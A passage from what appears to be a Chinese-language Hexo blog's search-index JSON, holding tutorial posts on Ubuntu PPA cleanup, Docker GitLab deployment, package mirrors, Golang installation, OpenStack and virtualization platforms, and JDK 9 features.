connected.Proxy request sent, awaiting response... 200 OKLength: unspecified [text/html]Saving to: ‘index.html’index.html [ &lt;=&gt; ] 12.40K --.-KB/s in 0.002s 2019-07-11 16:00:54 (5.04 MB/s) - ‘index.html’ saved [12702] 局域网代理我们已经实现了宿主机和虚拟机的网络代理，而我们的虚拟机由于使用了 桥接模式，那么它和局域网物理机是一样的，所以，局域网的物理机也可以按葫芦画瓢进行代理上网。 一台觉得PC机做代理资源比较浪费的话，可以在VM中刷OpenWRT固件，在OpenWRT中安装VxN也是可行的，网上有教程。如果手上有OpenWRT的路由器更好，就不需要在PC机上跑了。 【VMware安装OpenWRT】","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Linux,ssr","slug":"Linux-ssr","permalink":"http://yoursite.com/tags/Linux-ssr/"}]},{"title":"Ubuntu 删除PPA源","slug":"Linux/Ubuntu 删除PPA源","date":"2019-07-07T13:52:36.000Z","updated":"2019-07-07T13:52:36.000Z","comments":true,"path":"Linux/Ubuntu 删除PPA源/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 删除PPA源/","excerpt":"","text":"添加一个PPA源1$ sudo add-apt-repository ppa:user/ppa-name PPA源失效如mongodb的源失效，每次 apt update 都会有错误提示。1234567891011root@bogon:~# apt-get update Ign:7 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 InRelease Get:8 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release [3,457 B]Get:9 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release.gpg [801 B]Err:9 https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release.gpg The following signatures were invalid: KEYEXPIRED 1544811256Fetched 329 kB in 5s (60.8 kB/s)Reading package lists... DoneW: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 Release: The following signatures were invalid: KEYEXPIRED 1544811256W: Failed to fetch https://repo.mongodb.org/apt/ubuntu/dists/xenial/mongodb-org/3.6/Release.gpg The following signatures were invalid: KEYEXPIRED 1544811256W: Some index files failed to download. They have been ignored, or old ones used instead. 删除PPA源进入 /etc/apt/sources.list.d/ 目录删除相关文件即可1234567891011root@bogon:~# cd /etc/apt/sources.list.d/root@bogon:/etc/apt/sources.list.d# lsdjcj-hybrid-trusty.list kirillshkrogalev-ffmpeg-next-trusty.list.save mongodb-org-3.6.list.save openjdk-r-ppa-trusty.list.savedjcj-hybrid-trusty.list.distUpgrade mongodb-org-3.4.list nginx-ubuntu-stable-xenial.list rabbitmq.listdjcj-hybrid-trusty.list.save mongodb-org-3.4.list.distUpgrade nginx-ubuntu-stable-xenial.list.save rabbitmq.list.distUpgradekirillshkrogalev-ffmpeg-next-trusty.list mongodb-org-3.4.list.save openjdk-r-ppa-trusty.list rabbitmq.list.savekirillshkrogalev-ffmpeg-next-trusty.list.distUpgrade mongodb-org-3.6.list openjdk-r-ppa-trusty.list.distUpgraderoot@bogon:/etc/apt/sources.list.d# root@bogon:/etc/apt/sources.list.d# root@bogon:/etc/apt/sources.list.d# root@bogon:/etc/apt/sources.list.d# rm mongodb-org-3.*","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Ubuntu,PPA","slug":"Ubuntu-PPA","permalink":"http://yoursite.com/tags/Ubuntu-PPA/"}]},{"title":"七、Docker-部署Gitlab","slug":"docker/七、Docker-部署Gitlab","date":"2019-07-07T11:58:36.000Z","updated":"2021-12-28T03:24:10.222Z","comments":true,"path":"docker/七、Docker-部署Gitlab/","link":"","permalink":"http://yoursite.com/docker/七、Docker-部署Gitlab/","excerpt":"","text":"以下三部分内容都是来自：【Gitlab文档】 注意，Gitlab至少需要2G内存来跑 一、docker方式：域名12345678910$ sudo docker pull gitlab/gitlab-ce:latest$ sudo docker run --detach \\--hostname gitlab.example.com \\--publish 443:443 --publish 80:80 --publish 22:22 \\--name gitlab \\--restart always \\--volume /srv/gitlab/config:/etc/gitlab \\--volume /srv/gitlab/logs:/var/log/gitlab \\--volume /srv/gitlab/data:/var/opt/gitlab \\gitlab/gitlab-ce:latest 二、docker方式：IP假如公网IP： 192.168.0.200 1234567891011$ sudo docker run --detach \\ --hostname gitlab.example.com \\ --publish 192.168.0.200:443:443 \\ --publish 192.168.0.200:80:80 \\ --publish 192.168.0.200:22:22 \\ --name gitlab \\ --restart always \\ --volume /srv/gitlab/config:/etc/gitlab \\ --volume /srv/gitlab/logs:/var/log/gitlab \\ --volume /srv/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:latest 运行时出现错误（可能要注释掉指定22端口）：12345docker: Error response from daemon: driver failed programming external connectivity on endpoint gitlab (b24b2757ac70353b9ea1f24ebdbaa9244fe614444619e604c3d29dc3d17ddce6): Error starting userland proxy: listen tcp 192.168.0.200:22: bind: address already in use. 非Docker安装Gitlab并不会和SSH的端口22产生冲突 三、docker-compose方式（推荐）1234567891011121314151617web: image: 'gitlab/gitlab-ce:latest' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://gitlab.example.com' # 这里可以填 gitlab.rb 的配置信息 gitlab_rails['time_zone'] = 'Asia/Shanghai' ports: - '80:80' #- '443:443' #- '22:22' volumes: - '/srv/gitlab/config:/etc/gitlab' - '/srv/gitlab/logs:/var/log/gitlab' - '/srv/gitlab/data:/var/opt/gitlab' 经过验证，Gitlab可以跑起来。 四、汉化版12345678910111213141516171819version: '3'services: gitlab: image: 'twang2218/gitlab-ce-zh:9.4' restart: unless-stopped hostname: 'gitlab.example.com' environment: TZ: 'Asia/Shanghai' GITLAB_OMNIBUS_CONFIG: | external_url 'http://gitlab.example.com' gitlab_rails['time_zone'] = 'Asia/Shanghai' ports: - '80:9999' #- '443:443' #- '22:22' volumes: - /home/fantj/app/docker/compose/gitlab/config:/etc/gitlab - /home/fantj/app/docker/compose/gitlab/data:/var/opt/gitlab - /home/fantj/app/docker/compose/gitlab/logs:/var/log/gitlab","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[]},{"title":"六、Docker-无法启动","slug":"docker/六、Docker-无法启动","date":"2019-07-07T11:56:36.000Z","updated":"2021-12-28T03:24:10.226Z","comments":true,"path":"docker/六、Docker-无法启动/","link":"","permalink":"http://yoursite.com/docker/六、Docker-无法启动/","excerpt":"","text":"控制docker123$ sudo systemctl start docker或者$ sudo service docker start 报错当尝试用docker时，提示以下错误12345678910111213141516171819202122232425root@bogon:~# docker ps -aCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?root@bogon:~# docker imagesCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?root@bogon:~#root@bogon:~#root@bogon:~# systemctl status docker.service● docker.service - LSB: Create lightweight, portable, self-sufficient containers. Loaded: loaded (/etc/init.d/docker; bad; vendor preset: enabled) Active: failed (Result: exit-code) since Mon 2019-07-08 10:52:45 CST; 10s ago Docs: man:systemd-sysv-generator(8) Process: 19187 ExecStart=/etc/init.d/docker start (code=exited, status=1/FAILURE)Jul 08 10:52:45 bogon systemd[1]: Stopped LSB: Create lightweight, portable, self-sufficient containers..Jul 08 10:52:45 bogon systemd[1]: Starting LSB: Create lightweight, portable, self-sufficient containers....Jul 08 10:52:45 bogon docker[19187]: * /usr/bin/dockerd not present or not executableJul 08 10:52:45 bogon systemd[1]: docker.service: Control process exited, code=exited status=1Jul 08 10:52:45 bogon systemd[1]: Failed to start LSB: Create lightweight, portable, self-sufficient containers..Jul 08 10:52:45 bogon systemd[1]: docker.service: Unit entered failed state.Jul 08 10:52:45 bogon systemd[1]: docker.service: Failed with result 'exit-code'.root@bogon:~#root@bogon:~#root@bogon:~# systemctl restart docker.serviceJob for docker.service failed because the control process exited with error code. See \"systemctl status docker.service\" and \"journalctl -xe\" for details. 卸载重装暂时没找到好的方法，只能重装了。这里用 --purge卸载及删除配置文件，但是docker镜像不会被删除。1234567root@bogon:~# sudo apt-get remove docker-ce --purgeroot@bogon:~# apt-get install docker-ceroot@bogon:~# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7598613e479b grafana/grafana \"/run.sh\" 2 months ago Exited (0) 2 months ago grafanabf7a8866a780 influxdb \"/entrypoint.sh infl…\" 2 months ago Exited (0) 3 weeks ago influxDbServicebab8133e7c9e hello-world \"/hello\" 2 months ago Exited (0) 2 months ago reverent_euclid","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"}]},{"title":"阿里云开源软件镜像","slug":"Linux/阿里云开源软件镜像","date":"2019-07-05T15:52:36.000Z","updated":"2022-01-18T03:14:17.875Z","comments":true,"path":"Linux/阿里云开源软件镜像/","link":"","permalink":"http://yoursite.com/Linux/阿里云开源软件镜像/","excerpt":"","text":"【阿里云开源软件镜像】 阿里巴巴开源镜像站由阿里系统服务团队开发并支持，主旨在于服务阿里云客户，并在此基础上为互联网用户提供支持。 目前提供 Debian、Ubuntu、 Fedora、Arch Linux、 CentOS、openSUSE、Scientific Linux、Gentoo 等多个发行版的软件安装源和ISO下载服务，我们竭力为互联网用户提供全面，高效和稳定的软件服务。 域名解析DNS12223.5.5.5223.6.6.6 ubuntu 18.04对于阿里云ECS用户，可以直接使用内部域名访问，而对于非云用户则需要使用公网域名 mirrors.aliyun.com 来访问。 图形界面配置 新手推荐使用图形界面配置： 系统设置 -&gt; 软件和更新 选择下载服务器 -&gt; “mirrors.aliyun.com” 手动更改创建自己的配置文件/etc/apt/sources.list.d/aliyun.list，内容：1234567891011121314deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse ubuntu 20.041234567891011121314deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"阿里云,镜像站,开源软件","slug":"阿里云-镜像站-开源软件","permalink":"http://yoursite.com/tags/阿里云-镜像站-开源软件/"}]},{"title":"Ubuntu 安装卸载软件","slug":"Linux/Ubuntu 安装卸载软件","date":"2019-07-05T14:56:36.000Z","updated":"2021-12-28T03:24:10.175Z","comments":true,"path":"Linux/Ubuntu 安装卸载软件/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 安装卸载软件/","excerpt":"","text":"apt-get 查看可安装的软件 1sudo apt-cache search all 获取包的相关信息 1sudo apt-cache show 删除包 1sudo apt-get remove 软件名 删除包，包括删除配置文件等 1sudo apt-get remove 软件名 --purge 删除包及其依赖的软件包+配置文件等 1sudo apt-get autoremove --purge 理下载文件的存档 &amp;&amp; 只清理过时的包 1sudo apt-get clean &amp;&amp; apt-get autoclean dpkg 查看软件包所在的目录以及该软件包中的所有文件 1sudo dpkg -L 软件名 查看软件包的版本信息 1sudo dpkg -l 软件名 验证安装 1sudo dpkg -l | grep '软件名' 安装deb包 1sudo dpkg -i 软件包 卸载软件 1sudo dpkg -r 软件包 卸载软件及包括配置文件 1sudo dpkg -P 软件包","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://yoursite.com/tags/Ubuntu/"}]},{"title":"腾讯开源软件镜像站上线","slug":"Linux/腾讯开源软件镜像站上线 - 副本","date":"2019-07-05T14:52:36.000Z","updated":"2021-12-28T03:24:10.182Z","comments":true,"path":"Linux/腾讯开源软件镜像站上线 - 副本/","link":"","permalink":"http://yoursite.com/Linux/腾讯开源软件镜像站上线 - 副本/","excerpt":"","text":"腾讯开源软件镜像站(Tencent Open Source Mirror Site)已于近日上线，其官方名称为「腾讯云软件源」，由腾讯云提供支持。 地址 &gt;&gt;&gt; mirrors.cloud.tencent.com 官方表示搭建此开源镜像站的目的在于宣传自由软件的价值，提高自由软件社区文化氛围，推广自由软件在国内的应用。 腾讯开源软件镜像站提供了主流的 Linux 发行版下载，如 Ubuntu、Arch Linux、CentOS 和 Debian 等，以及常用的开源项目和 SDK 下载，如 Android SDK、Ceph、Flutter、Qt 和 Zabbix 等。 软件源同步频率为每天一次，同步的时间为凌晨0点-2点，部分常用的源Centos、Ubuntu、Debian、Debian-security等每天同步四次，同步时间为0点-18点。 文件列表项中的帮助链接为Linux发行版本软件的安装源的帮助，如果您有任何不懂可以点击获取相应的帮助。 若您使用腾讯云服务器，请将源的域名从 mirrors.cloud.tencent.com 改为 mirrors.tencentyun.com，使用内网流量不占用公网流量。 使用腾讯云镜像源加速maven打开maven的设置文件settings.xml，配置如下repository mirror：123456&lt;mirror&gt; &lt;id&gt;nexus-tencentyun&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;Nexus tencentyun&lt;/name&gt; &lt;url&gt;http://mirrors.tencentyun.com/nexus/repository/maven-public/&lt;/url&gt;&lt;/mirror&gt;","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"腾讯,镜像站,开源软件","slug":"腾讯-镜像站-开源软件","permalink":"http://yoursite.com/tags/腾讯-镜像站-开源软件/"}]},{"title":"Ubuntu 18.04 LTS 安装Golang","slug":"Linux/Ubuntu 18.04 LTS 安装Golang","date":"2019-07-04T13:52:36.000Z","updated":"2019-07-04T13:52:36.000Z","comments":true,"path":"Linux/Ubuntu 18.04 LTS 安装Golang/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 18.04 LTS 安装Golang/","excerpt":"","text":"快速安装1234$ sudo apt-get update$ sudo apt-get install golang-go$ go versiongo version go1.10.1 linux/amd64 最新版【golang.org】 是无法访问的，【golang.google.cn】 可以下载最新版本 【v1.12.6】，【安装文档在这里】 。 以下是翻译: 下载，选择合适的版本 解压到 /usr/local, creating a Go tree in /usr/local/go. 例如:12&gt; tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz&gt; 加入 /usr/local/go/bin 环境变量. 可以加入到 /etc/profile 或者 $HOME/.profile:12&gt; export PATH=$PATH:/usr/local/go/bin&gt; 使变量生效 source $HOME/.profile. 安装【v1.12.6】示例123456789101112131415$ cd /usr/local$ sudo wget https://dl.google.com/go/go1.12.6.linux-amd64.tar.gz$ sudo tar -xzf go1.12.6.linux-amd64.tar.gz$ vim ~/.profileexport GOROOT=/usr/local/goexport GOPATH=/home/samwen/golangworks export GOBIN=$GOPATH/binexport PATH=$PATH:$GOROOT/binexport PATH=$PATH:$GOPATH/bin$ source ~/.profile$ echo $GOBIN/home/samwen/golangworks/bin$ go versiongo version go1.12.6 linux/amd64 写个demo试试 123456789101112131415161718192021222324$ cd ~/golangworks$ mkdir -p src/demo$ cd src/demo$ vim hello.gopackage mainimport \"fmt\"func main() &#123; fmt.Println(\"Hello Golang\")&#125;# 运行$ go run hello.goHello Golang# build可执行文件（build在任何目录都可以执行）$ go build hello.go$ lshello hello.go$ ./helloHello Golang# install 必须在 GOPATH 下，可执行文件在$GOPATH/bin$ go install hello.go$ ../../bin/demo Hello Golang","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://yoursite.com/tags/Golang/"}]},{"title":"初识OpenStack","slug":"虚拟化技术&云平台/初识OpenStack","date":"2019-06-18T11:55:36.000Z","updated":"2021-12-28T03:24:10.300Z","comments":true,"path":"虚拟化技术&云平台/初识OpenStack/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/初识OpenStack/","excerpt":"","text":"什么是 OpenStack 官网介绍：OpenStack is a cloud operating system that controls large pools of compute, storage, and networking resources throughout a datacenter, all managed and provisioned through APIs with common authentication mechanisms.A dashboard is also available, giving administrators control while empowering their users to provision resources through a web interface.Beyond standard infrastructure-as-a-service functionality, additional components provide orchestration, fault management and service management amongst other services to ensure high availability of user applications.有道翻译：OpenStack是一个云操作系统，它控制整个数据中心中的大量计算、存储和网络资源，所有这些资源都是通过具有公共身份验证机制的api管理和供应的。还提供了一个仪表板，让管理员控制，同时授权用户通过web界面提供资源。除了标准的基础设施即服务功能之外，其他组件还提供编排、故障管理和服务管理，以确保用户应用程序的高可用性。 Openstack最初是由NASA和Rackspace在2010年共同发起的一个开源的云计算平台项目，目前项目正在被 Reahat、IBM、AMD、Intel、戴尔、思科、微软等超过一百家厂商共同研发，目前国内对于云计算的需求也逐渐增加，华胜天成、高德地图、京东、阿里巴巴、百度、中兴、华为等中国企业也加入到了Openstack项目研发当中，Openstack项目也正在随着全球内得到了众多厂商的参与支持而快速成熟。 OpenStack 是一系列开源工具（或开源项目）的组合，主要使用池化虚拟资源来构建和管理私有云及公共云。其中的六个项目主要负责处理核心云计算服务，包括计算、网络、存储、身份和镜像服务。还有另外十多个可选项目，用户可把它们捆绑打包，用来创建独特、可部署的云架构。 试想一下，在 虚拟化环境中，诸如存储、CPU 和 RAM 等资源都是从诸多供应商特定的项目中提取出来，然后由虚拟机监控程序进行拆分并按需进行分配。OpenStack 使用一组一致的应用编程接口（API），进一步将这些虚拟资源提取为离散池，用于辅助标准云计算工具，供管理员和用户直接交互使用。 OpenStack 实际上由一系列叫作脚本的命令组成。这些脚本会被捆绑到名为项目的软件包中，这些软件包则用于传递创建云环境的任务。为了创建这些环境，OpenStack 还会使用 2 种其他类型的软件： 虚拟化软件，用于创建从硬件中抽象出来的虚拟资源层 基础操作系统（OS），用于执行 OpenStack 脚本发出的命令 你可以这样理解：OpenStack 本身不会虚拟化资源，但会使用虚拟化资源来构建云。OpenStack 也不执行命令，但会将命令转发到基础 OS。OpenStack、虚拟化软件和基础操作系统，这 3 种技术必须协同工作。正是由于这种相互依赖性，所以许多人才会使用 Linux® 来部署 OpenStack 云，也因此，RackSpace 和 NASA 才会将 OpenStack 作为开源软件来发布。 OpenStack 解决什么问题管理虚拟化软件， OpenStack 几乎支持所有的虚拟化管理程序，不论是开源的 Xen 与 KVM 还是厂商的（Hyper-V与VMware），如果在一两台机安装 Xen 与 KVM，那没什么问题，如果有大量的机器，那管理是不是很麻烦？除了要安装操作系统，还需要管理网络，磁盘等等！ OpenStack 就是解决这些管理问题，通俗的讲，OpenStack 是可以为你提供一个类似 亚马逊控制台的东西，假如一些大企业不使用 亚马逊云ES或者阿里云ESC等公有云，自己搭建机房和云平台（私有云），那么 OpenStack 可以帮助企业管理云，它主要的目标是简化资源的管理和分配。 OpenStack 中有哪些项目？OpenStack用Python写的，包含很多组件，类似DIY一台PC机一样。 OpenStack 架构由大量开源项目组成。其中包含 6 个稳定可靠的核心服务，用于处理计算、网络、存储、身份和镜像； 同时，还为用户提供了十多种开发成熟度各异的可选服务。OpenStack 的 6 个核心服务主要担纲系统的基础架构，其余项目则负责管理控制面板、编排、裸机部署、信息传递、容器及统筹管理等操作。 Nova 是一个完整的 OpenStack 计算资源管理和访问工具，负责处理规划、创建和删除操作。 Neutron 能够连接其他 OpenStack 服务并连接网络。 Swift 是一种高度容错的对象存储服务，使用 RESTful API 来存储和检索非结构数据对象。 Cinder 通过自助服务 API 访问持久块存储。 Keystone 认证所有 OpenStack 服务并对其进行授权。同时，它也是所有服务的端点目录。 Glance 可存储和检索多个位置的虚拟机磁盘镜像。 OpenStack 安装部署繁琐?安装官网资料，OpenStack的安装时简单的，具体可以看 《参考资料：使用openstack部署云计算服务环境》，该文完全的演示了如何在Openstack软件中配置虚拟网络、创建主机实例模板、创建云主机实例、添加及挂载云硬盘等操作。 外界的评价如何？外界对OpenStack的评价可不太好，甚至有一种声音为：OpenStack已死。为什么会有这种声音？ 先看一下OpenStack的历史： 2010年，NASA和Rackspace公司将其开源。2012年，NASA停止OpenStack研发。2015年，Rackspace宣布将客户业务迁移到AWS。…… 虽然国外很多大厂都放弃OpenStack，但国内OpenStack的热度还是很好的，总的来说，OpenStack入门门槛还是比较低的，普通的运维估计都能搞定。知乎：Openstack和阿里云、AWS、AZURE等的竞争发展趋势分析？放弃 OpenStack？恐怕还不到时候 国内哪些大厂在用OpenStack？网上说腾讯和华为云起步的比较晚，都是基于OpenStack的。 AWS最早的模型在2002年就出现了，2006年正式上线。Google的GAE最早是 2008 年出现，比亚马逊晚了起码两年。阿里云也是在2008年开始的，其飞天云系统2009年上线，而openstack是2010年开始开源的。 所以在2018年5月23日云栖大会上阿里云总裁胡晓明表示：“坚持自主研发之路，“‘拿来主义’盖不出高楼大厦，自主研发的云才能走得更远”。 多年发展之后，中国云计算行业呈现出两种发展路径：一种是从底层开始自主研发操作系统，比如阿里云的飞天；一种是基于OpenStack等第三方软件搭建。自主研发通常需要投入巨量的人、财、物，短期看不到成功，遇到多方质疑仍要坚持初心，是典型的“Hard模式”。亚马逊的AWS、微软的Azure、阿里巴巴的阿里云等全球最大的三朵云都是自主研发。 参考资料 使用openstack部署云计算服务环境 OpenStack与KVM的区别与联系 Redhat:了解 OpenStack OpenStack，冰火两重天？ 腾讯成OpenStack基金会黄金会员 2018 年 OpenStack 用户调查报告 “拿来主义”盖不起高楼大厦","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"KVM,Xen,OpenStack","slug":"KVM-Xen-OpenStack","permalink":"http://yoursite.com/tags/KVM-Xen-OpenStack/"}]},{"title":"虚拟化平台对比","slug":"虚拟化技术&云平台/虚拟化平台对比","date":"2019-06-18T11:52:36.000Z","updated":"2021-12-28T03:24:10.301Z","comments":true,"path":"虚拟化技术&云平台/虚拟化平台对比/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/虚拟化平台对比/","excerpt":"","text":"本文只对比：KVM、Xen、VMWare VMWareVMWare是一个成熟的商业软件，市场占有率很高，但是操作系统安装在VMWare上面比直接装硬件上性能低不少，所以它比较适合学习和测试。 仿真虚拟化：对系统硬件没有要求，性能低。 Xen Xen在2013年时就使用过，13年那时候跟着老大在机房装Xen，然后跑了几台CentOS做TCP长连接测试，当时不懂事，不明白它存在的价值，以为它就是类似VMWare的软件，只不过Xen是开源软件，和VirtualBox差不多。 Xen 是英国剑桥大学计算机实验室开发的一个虚拟化开源项目，是一个Hypervisor程序（虚拟机管理程序），XEN 可以在一套物理硬件上安全的执行多个虚拟机，它和操作平台结合的极为密切，占用的资源最少。 Xen支持半虚拟化和全虚拟化，性能比VMWare好很多，在其官网可见，亚马逊云、阿里云、华为云等都是 Xen Project 的会员。 国内比较早的云服务商（如阿里云）都是使用Xen，REHL5默认自带Xen，但是后来KVM发展起来了，现在主流都采用KVM。 半虚拟化（早期Xen只支持半虚拟化）：虚拟机可以使用物理机硬件，性能高，但是需要改内核，虚拟机内只能安装和物理机一样的系统。 KVMKVM 全称是 基于内核的虚拟机（Kernel-based Virtual Machine），它由以色列公司 Quramnet 开发，该公司于 2008年被 RedHat 收购，KVM 是开源的，它被Linux核心组织放入Linux的内核里面，作为Linux 的一个内核模块（Linux 2.6.20及以上版本），KVM主打的就是高性能、扩展性、高安全，以及低成本。所以KVM对Xen的优势很大，加上RedHat等公司大力投入，KVM发展很快，现在基本上已成为主流。 目前的云服务商的产品都转向KVM了，RHEL6开始抛弃Xen，自带自家的KVM，详细可以看文章《Linux查看使用哪种虚拟化平台》 全虚拟化：直接使用物理硬件，性能最高，而且可以运行其他系统，如Windows。 参考资料 Xen V.S. KVM终于画上了一个完美的句号 科普：KVM与XEN虚拟化环境究竟有何不同？ KVM 介绍 虚拟化及Xen和KVM介绍 虚拟化 - KVM 和 Xen 比较","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"KVM,Xen,VMWare","slug":"KVM-Xen-VMWare","permalink":"http://yoursite.com/tags/KVM-Xen-VMWare/"}]},{"title":"Linux查看主机使用哪种虚拟化平台","slug":"Linux/Linux查看主机使用哪种虚拟化平台","date":"2019-06-18T11:50:36.000Z","updated":"2021-12-28T03:24:10.166Z","comments":true,"path":"Linux/Linux查看主机使用哪种虚拟化平台/","link":"","permalink":"http://yoursite.com/Linux/Linux查看主机使用哪种虚拟化平台/","excerpt":"","text":"我们知道在亚马逊云、阿里云或者腾讯云购买的主机都是通过虚拟技术将物理机虚拟出来的，而流行虚拟化平台有：VMWare、Xen 和 KVM等，如果想知道他们是采用了哪种虚拟化平台，要怎么做呢？ dmesg命令如果主机装的是Linux系统，可以通过以下命令行确认平台1$ dmesg | egrep &quot;kvm|xen|vmware&quot; 运行结果如下： vmware虚拟机 123456 [ 0.000000] vmware: TSC freq read from hypervisor : 2904.000 MHz [ 0.000000] vmware: Host bus clock speed read from hypervisor : 66000000 Hz [ 0.000000] vmware: using sched offset of 6513244607 ns [ 5.378124] systemd[1]: Detected virtualization vmware. ``` 2. 阿里云ECS(2019年购买) [ 0.000000] kvm-clock: cpu 0, msr 0:7ff34001, primary cpu clock [ 0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00 [ 0.000000] kvm-clock: using sched offset of 690581591653318 cycles [ 0.000000] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns [ 0.000000] kvm-stealtime: cpu 0, msr 7fc24040 [ 0.116255] clocksource: Switched to clocksource kvm-clock [ 1.789279] systemd[1]: Detected virtualization kvm. 12343. Xen平台没有相关的测试环境 据说亚马逊云和阿里云早期都是采用Xen，KVM发展起来之后，大部分云产商都转向KVM了。所以只有比较早购买的阿里云主机才是Xen平台的，亚马逊云由于历史原因，迁移到KVM比较慢，所以可能还存在比较多的Xen主机。## 安装 virt-what $ apt-get install virt-what$ yum install virt-what1234运行 `virt-what` 这个软件，直接可以输出虚拟平台1. vmware虚拟机 $ virt-what vmware 12. 阿里云ECS(2019年购买) $ virt-what kvm ```","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"kvm","slug":"kvm","permalink":"http://yoursite.com/tags/kvm/"}]},{"title":"JDK 9 新特性","slug":"Java/JDK 9 新特性","date":"2019-06-15T01:51:37.000Z","updated":"2021-12-28T03:24:10.148Z","comments":true,"path":"Java/JDK 9 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 9 新特性/","excerpt":"","text":"Java 9 正式发布于 2017 年 9 月 21 日 。作为 Java8 之后 3 年半才发布的新版本，Java 9 带 来了很多重大的变化。其中最重要的改动是 Java 平台模块系统的引入。除此之外，还有一些新的特性 Java 平台 模块系统Java 平台模块系统，也就是 Project Jigsaw，把模块化开发实践引入到了 Java 平台中。在引入了模块系统之后，JDK 被重新组织成 94 个模块。Java 应用可以通过新增的 jlink 工具，创建出只包含所依赖的 JDK 模块的自定义运行时镜像。这样可以极大的减少 Java 运行时环境的大小。这对于目前流行的不可变基础设施的实践来说，镜像的大小的减少可以节省很多存储空间和带宽资源 。 Jshelljshell 是 Java 9 新增的一个实用工具。jshell 为 Java 增加了类似 NodeJS 和 Python 中的读取-求值-打印循环（ Read-Evaluation-Print Loop ） 。 在 jshell 中 可以直接 输入表达式并查看其执行结果。当需要测试一个方法的运行效果，或是快速的对表达式进行求值时，jshell 都非常实用。只需要通过 jshell 命令启动 jshell，然后直接输入表达式即可。每个表达式的结果会被自动保存下来 ，以数字编号作为引用，类似 $1 和$2 这样的名称 。可以在后续的表达式中引用之前语句的运行结果。 在 jshell 中 ，除了表达式之外，还可以创建 Java 类和方法。jshell 也有基本的代码完成功能。 在代码清单 2 中，我们直接创建了一个方法 add。清单 2. 在 jshell 中添加方法 1234jshell&gt; int add(int x, int y) &#123; ...&gt; return x + y; ...&gt; &#125; | created method add(int,int) 接着就可以在 jshell 中直接使用这个方法，如 代码清单 3 所示。清单 3. 在 jshell 中使用创建的方法 12jshell&gt; add(1, 2) $19 ==&gt; 3 集合、Stream 和 Optional 在集合上，Java 9 增加 了 List.of()、Set.of()、Map.of() 和 M ap.ofEntries()等工厂方法来创建不可变集合 ，如 代码清单 4 所示。清单 4 . 创建不可变集合 12345678List.of(); List.of(\"Hello\", \"World\"); List.of(1, 2, 3);Set.of(); Set.of(\"Hello\", \"World\"); Set.of(1, 2, 3);Map.of();Map.of(\"Hello\", 1, \"World\", 2); Stream 中增加了新的方法 